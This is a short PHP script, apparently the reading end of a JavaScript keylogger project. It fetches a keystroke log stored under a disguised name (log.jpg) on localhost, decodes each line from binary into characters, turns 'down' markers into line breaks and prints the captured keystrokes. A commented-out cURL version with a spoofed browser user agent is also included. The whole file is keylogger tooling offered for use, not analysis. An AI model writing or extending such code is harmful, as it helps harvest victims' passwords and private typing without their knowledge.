<?php 
// $curl = curl_init('http://localhost/js-keylogger/log.jpg');
// curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
// curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
// curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/534.10');
// $url = curl_exec($curl);
// curl_close($curl);

// if (!$url) {
//   die("Erreur la page est indisponible");
// }

$chaine=file_get_contents("http://localhost/js-keylogger/log.jpg");

$split = explode("\n",$chaine);
// var_dump($split);

 
function bin2str($bin) {
    $str = '';
    $split = str_split($bin, 8);
    $count = count($split);
    for($i = 0; $i < $count; $i++) {
        $str .= chr(bindec($split[$i]));
    }
    return $str;
}
$result = array();

for ($i=0; $i < count($split); $i++) { 
$str = bin2str($split[$i]);
array_push($result, $str);
}
$f_result = str_replace("down", "\n\r", $result);
print_r($f_result);
 ?>